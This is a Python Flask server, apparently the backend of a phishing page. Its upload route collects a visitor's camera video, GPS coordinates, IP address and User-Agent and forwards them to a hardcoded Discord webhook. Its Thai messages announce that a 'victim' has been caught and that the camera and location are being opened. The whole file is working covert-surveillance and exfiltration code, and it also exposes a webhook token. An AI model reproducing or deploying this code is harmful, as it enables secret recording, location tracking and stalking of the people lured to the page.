import os
import requests
from flask import Flask, request, render_template, jsonify

app = Flask(__name__)

# Webhook URL ของมึง (กูเอามาใส่ให้แล้ว)
WEBHOOK_URL = "https://discord.com/api/webhooks/1525496997417717924/2XhKXiq5gHrepV5H8uDzECt2JOGBknizoq2VwN4CqbO6Vb1OSqSZ0u-eZZgQv232xAZb"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    try:
        video_file = request.files.get('video')
        lat = request.form.get('lat')
        lng = request.form.get('lng')
        user_agent = request.headers.get('User-Agent')

        if not video_file:
            return jsonify({'status': 'error', 'message': 'Missing video'}), 400

        # จัดรูปแบบ Webhook
        data = {
            'content': f"**📹 จับเหยื่อได้แล้ว!**\n**GPS:** `{lat}, {lng}`\n**User-Agent:** `{user_agent}`\n**IP:** `{request.remote_addr}`\n➡️ **กำลังเปิดกล้องและพิกัด!**"
        }
        
        # แนบไฟล์วิดีโอไปกับ Webhook
        files = {
            'file': (video_file.filename, video_file.stream, video_file.mimetype)
        }
        
        response = requests.post(WEBHOOK_URL, data=data, files=files)
        print(f"[+] ส่งไป Discord แล้ว! Status: {response.status_code}")
        return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({'status': 'error'}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)